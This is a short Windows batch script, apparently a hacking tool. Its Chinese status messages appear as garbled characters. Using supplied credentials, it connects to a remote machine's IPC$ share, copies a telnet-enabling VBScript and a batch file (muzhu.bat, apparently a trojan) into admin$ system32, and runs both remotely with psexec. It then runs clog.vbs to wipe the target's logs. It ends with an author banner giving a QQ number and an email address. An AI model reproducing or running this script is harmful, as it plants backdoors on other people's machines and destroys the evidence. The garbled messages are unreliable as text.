@echo ľ�����г�ʼ����������
@net use \\%1\ipc$ %3 /user:"%2"
@if errorlevel 1 goto help
@echo �������ӳɹ���!!
@copy telnet.vbs \\%1\admin$\system32
@if errorlevel 1 goto over
@echo ���⼦COPY����telnet���ļ���������OK!
@copy muzhu.bat \\%1\admin$\system32
@echo ���⼦COPYľ��������OK!
@psexec -d \\%1 c:\winnt\system32\telnet.vbs
@echo ���ڿ���telnet��������OK!
@psexec -d \\%1 c:\winnt\system32\muzhu.bat
echo ִ���⼦�ϵ�ľ��������OK!
:over
@cscript clog.vbs %1 %2 %3 -all
@echo ����⼦����־�ļ���������OK
@echo ľ��װ���!5����֮���⼦������� !
@echo ***************************************************************
@echo ���ߣ����´̿� QQ:158017079 Email:piaoxue12603.student@sina.com
@echo ***************************************************************
@goto end
:help
@echo �ò�~~��������ʧ��!�޷���װľţ!��̨�⼦���԰�!ʲô?��û����??��~~~
:end
